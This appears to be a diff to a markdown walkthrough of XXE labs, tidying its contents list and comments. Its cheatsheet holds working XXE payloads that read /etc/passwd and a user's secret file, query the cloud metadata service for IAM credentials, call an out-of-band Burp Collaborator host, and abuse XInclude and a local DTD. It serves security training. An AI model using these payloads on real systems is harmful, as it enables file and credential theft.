@@ -17,14 +17,13 @@
 ```
 ## Walkthrough - Most Important Labs
 
-- [1]()
-
-
 - [CHEATSHEET](#cheatsheet)
 - [BLIND XXE EXTERNAL DTD](#blind-xxe-external-dtd)
 - [BLIND XXE ERROR BASED MESSAGE](#blind-xxe-error-based-messages)
 - [XXE INCLUDE](#xxe-include)
 - [XXE DTD LOCAL](#xxe-dtd-local)
+
+<br>
 
 
 ## CHEATSHEET
@@ -32,7 +31,7 @@
 <!DOCTYPE foo [ <!ENTITY xxe-entity "test" > ]>
 <!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "/etc/passwd" > ]>
 <!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "file:///etc/passwd" > ]>  
-<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "file:///home/carlos/morale.txt" > ]>  
+<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "file:///home/carlos/secret" > ]>  
 <!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "https://example.com/archivo.txt" > ]>
 <!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]> # Directory listing
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://<BURP-COLLAB>"> ]> # DNS lookup
@@ -69,8 +68,8 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 #### XXE-DTD-LOCAL
-# /usr/share/yelp/dtd/docbookx.dtd is a local DTD found in GNOME environments
-# Important: represent certain characters in hexadecimal`
+> /usr/share/yelp/dtd/docbookx.dtd is a local DTD found in > GNOME environments
+> Important: represent certain characters in hexadecimal`
 ```bash
 <!DOCTYPE foo [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
